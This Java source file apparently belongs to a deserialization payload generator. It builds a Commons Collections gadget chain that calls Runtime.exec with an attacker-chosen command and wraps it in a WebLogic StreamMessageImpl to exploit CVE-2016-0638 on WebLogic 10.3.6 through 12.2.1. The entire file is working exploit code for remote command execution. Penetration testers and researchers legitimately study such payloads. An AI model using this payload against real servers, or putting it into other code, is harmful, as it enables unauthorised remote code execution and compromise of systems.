package payloads;

import common.Serializer;
import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.map.LazyMap;
import payloads.annotation.Authors;
import payloads.annotation.Dependencies;
import util.Gadgets;
import util.PayloadRunner;
import util.Reflections;

import java.lang.reflect.InvocationHandler;
import java.util.HashMap;
import java.util.Map;
import weblogic.jms.common.StreamMessageImpl;

/*
	CVE-2016-0638
	CC1 StreamMessageImpl
 */
@SuppressWarnings({"rawtypes", "unchecked"})
@Dependencies({"weblogic:10.3.6.0, 12.1.3.0, 12.2.1.0"})
@Authors({ Authors.CCKUAILONG })
public class Weblogic1 extends PayloadRunner implements ObjectPayload<Object> {

	public Object streamMessageImpl(byte[] object) {
		StreamMessageImpl streamMessage = new StreamMessageImpl();
		streamMessage.setDataBuffer(object, object.length);
		return streamMessage;
	}

	public Object getObject(final String command) throws Exception {
		final String[] execArgs = new String[] { command };
		// inert chain for setup
		final Transformer transformerChain = new ChainedTransformer(
			new Transformer[]{ new ConstantTransformer(1) });
		// real chain for after setup
		final Transformer[] transformers = new Transformer[] {
				new ConstantTransformer(Runtime.class),
				new InvokerTransformer("getMethod", new Class[] {
					String.class, Class[].class }, new Object[] {
					"getRuntime", new Class[0] }),
				new InvokerTransformer("invoke", new Class[] {
					Object.class, Object[].class }, new Object[] {
					null, new Object[0] }),
				new InvokerTransformer("exec",
					new Class[] { String.class }, execArgs),
				new ConstantTransformer(1) };

		final Map innerMap = new HashMap();

		final Map lazyMap = LazyMap.decorate(innerMap, transformerChain);

		final Map mapProxy = Gadgets.createMemoitizedProxy(lazyMap, Map.class);

		final InvocationHandler handler = Gadgets.createMemoizedInvocationHandler(mapProxy);

		Reflections.setFieldValue(transformerChain, "iTransformers", transformers); // arm with actual transformer chain

		return streamMessageImpl(Serializer.serialize(handler));
	}

	public static byte[] getBytes(final String command) throws Exception {
		return PayloadRunner.run(Weblogic1.class, command);
	}

	public static void main(final String command) throws Exception {
		PayloadRunner.run(Weblogic1.class, command);
	}

}
